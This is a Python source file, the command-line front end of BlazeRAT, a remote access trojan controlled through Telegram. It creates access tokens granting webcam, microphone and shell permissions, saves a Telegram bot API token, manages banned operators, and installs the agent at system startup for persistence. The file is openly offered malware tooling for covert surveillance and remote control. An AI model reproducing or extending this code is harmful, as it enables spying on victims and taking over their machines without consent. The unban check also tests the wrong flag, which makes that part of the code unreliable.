#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from sys import exit
from config import perms
from argparse import ArgumentParser
from core.banned import \
    EnumerateBannedUsers, BanUser
from core.tokens import \
    TokenCreate, TokenDelete, EnumeratePermissions, WriteTelegramBotAPI_Token
from services.startup import \
    ServiceInstalled, ServiceInstall, ServiceUninstall

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed to process actions by the command line
    and store the banner.
"""

""" Handle cli commands """
def ParseArgs():
    parser = ArgumentParser(description="BlazeRAT - Command Line Interface")

    # Token manager
    parser.add_argument("--perms", nargs="+", type=str,
                        metavar=", ".join(perms),
                        help="Permissions list for new token")
    parser.add_argument("--name", type=str,
                        help="Name for token")
    parser.add_argument("--TokenCreate", action="store_true",
                        help="Create new token with permissions")
    parser.add_argument("--TokenDelete", action="store_true",
                        help="Delete token with permissions")
    parser.add_argument("--TokenPerms", action="store_true",
                        help="Get token permissions")

    # Telegram API token manager
    parser.add_argument("--InitApiToken", type=str,
                        metavar="<token>",
                        help="Telegram Bot API token")

    # Ban manager
    parser.add_argument("--Banlist", action="store_true",
                        help="Get banned users list")
    parser.add_argument("--BanUser", action="store_true",
                        help="Ban user")
    parser.add_argument("--UnbanUser", action="store_true",
                        help="Unban user")
    parser.add_argument("--chatid", type=int,
                        help="Telegram chatid")
    parser.add_argument("--reason", type=str,
                        help="Ban reason")
    # Startup
    parser.add_argument("--InstallAgent", action="store_true",
                        help="Add to startup")
    parser.add_argument("--UninstallAgent", action="store_true",
                        help="Remove from startup")

    args = parser.parse_args()

    # Require --perms and --name for --TokenCreate
    if args.TokenCreate and (args.perms is None or args.name is None):
        parser.error("--TokenCreate requires --perms and --name")

    # Require --name for --TokenDelete
    elif args.TokenDelete and args.name is None:
        parser.error("--TokenDelete requires --name")

    # Require --chatid and reason for --BanUser
    elif args.BanUser and (args.chatid is None or args.reason is None):
        parser.error("--chatid and --reason arguments required to ban user")

    # Require --chatid for --UnbanUser
    elif args.BanUser and args.chatid is None:
        parser.error("--chatid argument required to unban user")

    # Create token:
    # Example: python3 main.py --TokenCreate --name root --perms 'WEBCAMERA' 'MICROPHONE' 'SHELL'
    if args.TokenCreate:
        token = TokenCreate(args.name, args.perms)
        exit(f"[+] Created new token {repr(token)}, with permissions: {', '.join(args.perms)}")

    # Delete token:
    # Example: python3 main.py --TokenDelete --name root
    elif args.TokenDelete:
        if TokenDelete(args.name):
            exit(f"[+] Token {repr(args.name)} deleted")
        else:
            exit(f"[!] Token {repr(args.name)} does not exists")

    # Enumerate token permissions:
    # Example: python3 main.py --TokenPerms --name root
    elif args.TokenPerms:
        out = EnumeratePermissions(args.name, have=True)
        exit(out)

    # Write telegram bot api token:
    # Example: python3 main.py --InitApiToken 1372352235:AAF_a2mqhyak1sBJl0IaDah85Ioy2MMB7Yc
    elif args.InitApiToken:
        WriteTelegramBotAPI_Token(args.InitApiToken)
        exit(f"[+] Telegram API token saved")

    # Add to startup:
    # Example: python3 main.py --InstallAgent
    elif args.InstallAgent:
        if not ServiceInstalled():
            out = ServiceInstall()
            exit(out)
        else:
            exit("[!] BlazeRAT agent already installed!")

    # Remove from startup:
    # Example: python3 main.py --UninstallAgent
    elif args.UninstallAgent:
        if ServiceInstalled():
            out = ServiceUninstall()
            exit(out)
        else:
            exit("[!] BlazeRAT not installed!")

    # Get banned users list:
    # Example: python3 main.py --Banlist
    elif args.Banlist:
        out = EnumerateBannedUsers()
        exit(out)

    # Ban user:
    # Example: python3 main.py --BanUser --chatid 2345123 --reason 'Tokens bruteforce'
    elif args.BanUser:
        BanUser(args.chatid, "Unknown", True, args.reason)
        exit(f"[+] User {args.chatid} is banned with reason: {args.reason}")

    # Unban user:
    # Example: python3 main.py --UnbanUser --chatid 2345123
    elif args.UnbanUser:
        BanUser(args.chatid, "", False)
        exit(f"[+] User {args.chatid} is unbanned")


"""
Terminal banner
You can create own banner here:
http://patorjk.com/software/taag/
"""
banner = (r"""
   ______   __                       _______            _
  |_   _ \ [  |                     |_   __ \          / |_
    | |_) | | |  ,--.   ____  .---.   | |__) |   ,--. `| |-'
    |  __'. | | `'_\ : [_   ]/ /__\\  |  __ /   `'_\ : | |
   _| |__) || | // | |, .' /_| \__., _| |  \ \_ // | |,| |,
  |_______/[___]\'-;__/[_____]'.__.'|____| |___|\'-;__/\__/
                                    # Created By LimerBoy #
""")
